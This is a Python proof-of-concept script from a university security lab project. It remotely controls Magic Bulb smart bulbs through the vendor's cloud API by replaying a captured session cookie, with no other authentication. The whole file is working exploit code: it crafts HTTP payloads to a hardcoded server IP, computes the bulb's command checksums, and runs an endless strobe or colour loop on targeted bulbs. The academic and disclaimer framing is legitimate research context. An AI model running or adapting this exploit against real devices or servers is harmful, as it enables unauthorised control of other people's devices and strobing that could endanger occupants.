# ECE419/CS460 Security Lab Project
# Bill Xun, Jonathan Hsun

# This is proof-of-concept code to exploit the Magic Bulb (v6/v8) to
# send arbitrary commands to the bulb without authentication or actions
# through the given app. This code can be used remotely, and can be 
# used on one or more bulbs.

# Refer to the local version of the code to manipulate the bulb inside
# the network (less overhead and functionality to search for bulbs)

# Refer to the report for more details

# This code is here for general information purposes only and should not
# be used on anyone's bulbs without permission.


import socket
import sys
from time import sleep
import random

# the host to connect to
HOST = '47.88.101.237'
# the port to connect to
PORT = 80
# authentication cookie obtained from wireshark or other packet software
cookie = "paste real cookie here... see report for details"
# boolean value to signal light to turn on/off for maximum strobe effect
spaz = False
# if rainbow mode is on
rainbow = False
# speed of strobing (in seconds)
speed = 0.05

mac_addr ="put the bulb mac address here -- no colons"
length = 48

# r,g,b, values
R = 0
G = 0
B = 0

#list of mac addresses
mac_addrs = []

# user choice 
command = 0

# parse user selections
nargs = len(sys.argv)
if nargs > 1:
	if sys.argv[1] == '-h':
		print "python magicctl_remote.py [COMMAND] [R] [G] [B]"
		print "Commands: \n1 - white strobe fast, 2 - white strobe slow\n3 - rainbow strobe fast, 4 - rainbow strobe slow\n5 - set color"
		exit(1)

	command = int(sys.argv[1])

	# settings
	if command == 1:
		speed = 0
	if command == 2:
		speed = 0.05
	if command == 3:
		rainbow = True
		speed = 0
	if command == 4:
		rainbow = True
		speed = 0.05

	# if you just want to change the color
	if command == 5:
		R = int(sys.argv[2])
		G = int(sys.argv[3])
		B = int(sys.argv[4])
		sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sk.connect((HOST, PORT))

		#create payload for hex data (in ascii not actual hex)
		data = '31' + hex(R)[2:].zfill(2) + hex(G)[2:].zfill(2)+ hex(B)[2:].zfill(2) +'00f00f'
		
		#convert this to hex to calculate checksum
		datahex = '31'.decode("hex") + hex(R)[2:].zfill(2).decode("hex") + hex(G)[2:].zfill(2).decode("hex") + hex(B)[2:].zfill(2).decode("hex") +'00f00f'.decode("hex")
		stuff = bytearray(datahex)
		# update payload with chefcksum
		data += hex(sum(stuff)%256)[2:].zfill(2)

		#update content length header
		length_payload = str(length + len(data) + len(mac_addr))

		# create payload
		payload = "POST http://47.88.101.237/WebMagicHome///api///AB004/PostRequestCommandBatch?CDPID=Rayn01 HTTP/1.0\nHost: ryan.magichue.net\nContent-Type: application/json\nCookie: .ASPXAUTH="+cookie+"\nConnection: keep-alive\nAccept: */*\nUser-Agent: LedWiFiProRyan/1.0.9 (iPhone; iOS 11.3; Scale/3.00)\nAccept-Language: en-GB;q=1, en-SG;q=0.9, zh-Hans-SG;q=0.8, ko-SG;q=0.7\nContent-Length: "+length_payload+"\nAccept-Encoding: gzip, deflate\r\n\r\n{\"DevicesCMDs\":[{\"HexData\":\"" + data + "\",\"MacAddress\":\""+mac_addr+"\"}]}\r \n \r \n " 

		print payload
		# payload = "POST http://47.88.101.237/WebMagicHome///api///AB004/PostRequestCommandBatch?CDPID=Rayn01 HTTP/1.0\nHost: ryan.magichue.net\nContent-Type: application/json\nCookie: .ASPXAUTH=" + cookie + "\nConnection: keep-alive\nAccept: */*\nUser-Agent: LedWiFiProRyan/1.0.9 (iPhone; iOS 11.3; Scale/3.00)\nAccept-Language: en-GB;q=1, en-SG;q=0.9, zh-Hans-SG;q=0.8, ko-SG;q=0.7\nContent-Length: "+ str(length_payload)+"\nAccept-Encoding: gzip, deflate\n\r\n{\"DevicesCMDs\":[{\"HexData\":\"" + data+ "\",\"MacAddress\":\"" + mac_addr +"\"}]}\r \n \r \n " 

		# send it
		sk.send(payload)

		#print response from server
		print sk.recv(1024)
		exit(1)

# helper function to generate random colors. R,G,B values are specifically chosen so that they aren't always white for maximum color effect
# R,G,B values with similar numbers produce white shades
def getrainbow():
	R = random.randint(0, 255-random.randint(0,255))
	G = random.randint(0, 255-R)
	B = random.randint(0, 255-G)
	# create payload based on hexcodes used by the bulb (refer to report) in ascii hex
	data = '31' + hex(R)[2:].zfill(2) + hex(G)[2:].zfill(2)+ hex(B)[2:].zfill(2) +'00f00f'
	return data

# do this FOREVER
while(1):
	#strobe it
	for i in range(2):
		# change the bulbs color
		if spaz:
			if not rainbow:
				data = '31ffffff00f00f'
			else:
				data = getrainbow()
		# turn the bulb off
		else:
			data = '3100000000f00f'
		spaz = spaz ^ True

		# open a tcp connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))

		# generate hex form of payload to calculate checksum
		datahex = data.decode("hex")
		stuff = bytearray(datahex)
		# add checksum
		data += hex(sum(stuff)%256)[2:].zfill(2)

		#update content length header
		length_payload = str(length + len(data) + len(mac_addr))

		#create payload to send
		payload = "POST http://47.88.101.237/WebMagicHome///api///AB004/PostRequestCommandBatch?CDPID=Rayn01 HTTP/1.0\nHost: ryan.magichue.net\nContent-Type: application/json\nCookie: .ASPXAUTH="+cookie+"\nConnection: keep-alive\nAccept: */*\nUser-Agent: LedWiFiProRyan/1.0.9 (iPhone; iOS 11.3; Scale/3.00)\nAccept-Language: en-GB;q=1, en-SG;q=0.9, zh-Hans-SG;q=0.8, ko-SG;q=0.7\nContent-Length: "+length_payload+"\nAccept-Encoding: gzip, deflate\r\n\r\n{\"DevicesCMDs\":[{\"HexData\":\"" + data + "\",\"MacAddress\":\""+mac_addr+"\"}]}\r \n \r \n " 

		#send it
		s.send(payload)
		#get server response
		print s.recv(1024)
		s.close()
		sleep(speed)

